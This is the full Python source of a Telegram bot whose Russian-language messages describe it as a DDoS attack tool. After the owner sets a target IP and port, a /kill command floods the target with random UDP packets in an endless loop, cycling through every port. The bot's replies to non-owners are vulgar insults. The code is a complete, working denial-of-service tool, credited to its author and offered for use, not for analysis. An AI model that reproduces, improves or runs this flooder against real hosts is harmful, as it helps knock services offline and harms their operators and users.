import telebot, sqlite3
from threading import Timer
import re
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import sys, os, socket, random
from bot import *
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
token = sys.argv[1]
id = sys.argv[2]

bot = telebot.TeleBot(token)

@bot.message_handler(commands=['start'])
def start_message(message):
	global id
	if message.chat.type == 'private':
		if str(message.from_user.id) == str(id):
			keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
			callback_button1 = KeyboardButton(text='Помощь')
			callback_button3 = KeyboardButton(text='Разработчик')
			keyboard.add(callback_button1, callback_button3)
			bot.send_message((message.chat.id), '''
Здраствуй мой хозяин! Я бот для DDos атак, не знаешь как мной пользоваться? Нажми на помощь, там ты быстро поймеш что к чему.
''', reply_markup=keyboard)
		else:
			bot.send_message(message.chat.id, 'Твой бот? Нет? Так иди нахуй!')

@bot.message_handler(content_types=['text'])
def send_text(message):
	global ip
	global port
	if '/ip' in message.text.lower():
		if message.chat.type == 'private':
			if str(message.from_user.id) == str(id):
				loll = message.text.split(' ')
				ip = loll[1]
				bot.send_message(message.chat.id, f"Айпи установлен: {ip}")
			else:
				bot.send_message(message.chat.id, 'Твой бот? Нет? Так иди нахуй!')
	elif message.text.lower() == 'помощь':
		if message.chat.type == 'private':
			if str(message.from_user.id) == str(id):
				bot.send_message(message.chat.id, 'Чтобы начать атаку на айпи нужно все настроить, сначало введи /ip (айпи который хочеш ддосить), далее порт на который будет идти ддос /port (порт), и наконец введи команду /kill для начала атаки.')
			else:
				bot.send_message(message.chat.id, 'Твой бот? Нет? Так иди нахуй!')
	elif message.text.lower() == 'разработчик':
		if message.chat.type == 'private':
			if str(message.from_user.id) == str(id):
				bot.send_message(message.chat.id, '\nРазработчик DarkGamer\n\nРепозиторий https://github.com/DarkGa/Dark_DDos\n\nВерсия 1.2\n')
			else:
				bot.send_message(message.chat.id, 'Твой бот? Нет? Так иди нахуй!')
	elif '/port' in message.text.lower():
		if message.chat.type == 'private':
			if str(message.from_user.id) == str(id):
				lol = message.text.split(' ')
				port = int(lol[1])
				bot.send_message(message.chat.id, f"Порт для ддос установлен: {port}")
			else:
				bot.send_message(message.chat.id, 'Твой бот? Нет? Так иди нахуй!')
	elif message.text.lower() == '/kill':
		if message.chat.type == 'private':
			if str(message.from_user.id) == str(id):
				try:
					sent = 0
					bot.send_message(message.chat.id, f'''
Жертва успешно атакуется
========================

ip: {ip}
port: {port}
''')
					while 1:
						sock.sendto(bytes, (ip, port))
						sent = sent + 1
						port = port + 1
						if port == 65534:
							port = 1
				except Exception as e:
					print(e)
					bot.send_message(message.chat.id, 'Произошла не известная ошибка!')
			else:
				bot.send_message(message.chat.id, 'Твой бот? Нет? Так иди нахуй!')


if __name__ == '__main__':
	bot.polling(none_stop=True)